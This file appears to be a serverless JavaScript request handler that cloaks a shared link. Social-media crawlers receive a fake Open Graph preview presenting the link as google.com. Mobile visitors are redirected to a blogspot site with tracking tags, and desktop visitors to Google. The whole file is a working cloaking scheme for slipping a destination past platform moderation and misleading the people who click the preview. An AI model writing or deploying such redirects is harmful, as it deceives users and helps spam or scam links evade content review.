export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="💢 💢 💢 💢">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://external.fbhv1-1.fna.fbcdn.net/emg1/v/t13/6183127639555560033?_nc_oc=AdqxcMbG6CAlArGgLUW2l7zVAZKl5pYHkFl_zZH7NM0w39F5aP83jjKCSD7Kucf-7iY&url=https%3A%2F%2Fwww.google.com%2Fshare.google%3Fq%3DyEaPkEKKecFxBUSpk&fb_obo=1&utld=google.com&_nc_sid=c97757&_nc_ht=external.fbhv1-1.fna.fbcdn.net&stp=c0.5000x0.5000f_dst-jpg_flffffff_p500x261_q75_tt6&ccb=18-1&_nc_gid=7Q1OexUD1PEbZoZAZxSxAw&_nc_map=urlgen_bucketless&_nc_zt=3&oh=06_Q3_EAcH9IveTJg3Afzk7JOawgO76snzUCRXh37zsyoJ7Sr_p&oe=6AC9212B">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://waseey.blogspot.com/?utm_source=RRR&utm_medium=GM", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
